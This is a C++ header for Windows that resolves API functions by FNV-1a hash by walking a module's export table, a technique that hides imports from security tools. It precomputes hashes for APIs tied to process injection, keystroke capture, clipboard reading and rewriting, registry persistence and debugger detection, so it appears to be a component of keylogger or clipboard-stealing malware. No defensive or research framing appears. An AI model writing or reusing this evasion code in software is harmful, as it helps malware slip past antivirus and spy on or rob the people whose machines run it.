#pragma once

#include <cstdint>
#include <string>

#ifdef _WIN32
#include <Windows.h>

namespace nuub::domain::api {

// Simple hash function for API names
constexpr uint32_t hash_api(const char* str) {
    uint32_t hash = 0x811C9DC5; // FNV-1a offset basis
    while (*str) {
        hash ^= static_cast<uint32_t>(*str);
        hash *= 0x01000193; // FNV-1a prime
        str++;
    }
    return hash;
}

// Runtime hash function
inline uint32_t hash_api_runtime(const char* str) {
    uint32_t hash = 0x811C9DC5;
    while (*str) {
        hash ^= static_cast<uint32_t>(*str);
        hash *= 0x01000193;
        str++;
    }
    return hash;
}

// Resolve API by hash from a module
template <typename FuncType>
FuncType resolve_api(const char* module_name, uint32_t target_hash) {
    HMODULE hModule = GetModuleHandleA(module_name);
    if (!hModule) return nullptr;

    auto* dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hModule);
    auto* ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS>(
        reinterpret_cast<uintptr_t>(hModule) + dosHeader->e_lfanew);

    auto* exportDir = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(
        reinterpret_cast<uintptr_t>(hModule) +
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    if (!exportDir) return nullptr;

    auto* names = reinterpret_cast<uint32_t*>(
        reinterpret_cast<uintptr_t>(hModule) + exportDir->AddressOfNames);
    auto* ordinals = reinterpret_cast<uint16_t*>(
        reinterpret_cast<uintptr_t>(hModule) + exportDir->AddressOfNameOrdinals);
    auto* functions = reinterpret_cast<uint32_t*>(
        reinterpret_cast<uintptr_t>(hModule) + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; ++i) {
        const char* name = reinterpret_cast<const char*>(
            reinterpret_cast<uintptr_t>(hModule) + names[i]);
        if (hash_api_runtime(name) == target_hash) {
            return reinterpret_cast<FuncType>(
                reinterpret_cast<uintptr_t>(hModule) + functions[ordinals[i]]);
        }
    }
    return nullptr;
}

// Pre-computed hashes for commonly used APIs
namespace hashes {
    // Kernel32
    constexpr uint32_t GetModuleHandleA = hash_api("GetModuleHandleA");
    constexpr uint32_t GetModuleHandleW = hash_api("GetModuleHandleW");
    constexpr uint32_t GetProcAddress = hash_api("GetProcAddress");
    constexpr uint32_t LoadLibraryA = hash_api("LoadLibraryA");
    constexpr uint32_t VirtualAlloc = hash_api("VirtualAlloc");
    constexpr uint32_t VirtualProtect = hash_api("VirtualProtect");
    constexpr uint32_t CreateThread = hash_api("CreateThread");
    constexpr uint32_t GetCurrentProcess = hash_api("GetCurrentProcess");
    constexpr uint32_t WriteProcessMemory = hash_api("WriteProcessMemory");
    constexpr uint32_t CreateProcessA = hash_api("CreateProcessA");
    constexpr uint32_t CreateProcessW = hash_api("CreateProcessW");
    constexpr uint32_t TerminateProcess = hash_api("TerminateProcess");
    constexpr uint32_t GetTickCount64 = hash_api("GetTickCount64");

    // Ntdll
    constexpr uint32_t NtQueryInformationProcess = hash_api("NtQueryInformationProcess");
    constexpr uint32_t RtlGetVersion = hash_api("RtlGetVersion");

    // User32
    constexpr uint32_t SetWindowsHookExA = hash_api("SetWindowsHookExA");
    constexpr uint32_t SetWindowsHookExW = hash_api("SetWindowsHookExW");
    constexpr uint32_t GetAsyncKeyState = hash_api("GetAsyncKeyState");
    constexpr uint32_t GetKeyboardState = hash_api("GetKeyboardState");
    constexpr uint32_t GetClipboardData = hash_api("GetClipboardData");
    constexpr uint32_t OpenClipboard = hash_api("OpenClipboard");
    constexpr uint32_t SetClipboardData = hash_api("SetClipboardData");
    constexpr uint32_t CloseClipboard = hash_api("CloseClipboard");

    // Advapi32
    constexpr uint32_t RegOpenKeyExA = hash_api("RegOpenKeyExA");
    constexpr uint32_t RegOpenKeyExW = hash_api("RegOpenKeyExW");
    constexpr uint32_t RegSetValueExA = hash_api("RegSetValueExA");
    constexpr uint32_t RegSetValueExW = hash_api("RegSetValueExW");
    constexpr uint32_t RegCloseKey = hash_api("RegCloseKey");
}

} // namespace nuub::domain::api
#endif
